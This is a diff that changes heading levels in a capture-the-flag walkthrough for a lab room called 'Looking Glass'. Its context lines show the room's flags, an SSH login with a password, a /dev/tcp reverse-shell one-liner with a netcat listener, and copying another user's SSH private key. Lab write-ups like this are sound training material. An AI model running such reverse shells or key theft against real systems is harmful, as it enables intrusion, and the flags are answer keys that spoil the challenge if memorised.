@@ -6,10 +6,10 @@
 
 <div align="center"> <img alt="Difficulty: Medium" src="https://img.shields.io/badge/Difficulty-Medium-yellow" /> <img alt="OS: Linux" src="https://img.shields.io/badge/OS-Linux-blue" /> </div>
 
-### Task 1. Looking Glass
+#### Task 1. Looking Glass
 Climb through the Looking Glass and capture the flags.
 
-### Get the user flag.
+#### Get the user flag.
 ```
 thm{65d3710e9d75d5f346d2bac669119a23}
 ```
@@ -24,11 +24,11 @@ ssh jabberwock@<IP> -p 22
 jabberwock:bewareTheJabberwock
 cat uxer.txt
 ```
-# ```+ 100``` Get the root flag.
+## ```+ 100``` Get the root flag.
 ```
 thm{bc2337b6f97d057b01da718ced6ead3f}
 ```
-# reverse
+## reverse
 ```
 ```commandline
 thm{65d3710e9d75d5f346d2bac669119a23}
@@ -45,7 +45,7 @@ sh -i >& /dev/tcp/<my_own_IP>/4444 0>&1
 nc -nlvp 4444
 ls -la
 cat humptydumpty.txt
-# SHA256
+## SHA256
 su humptydumpty
 cat poetry.txt
 cp /home/alice/.ssh/id_rsa /home/humptydumpty
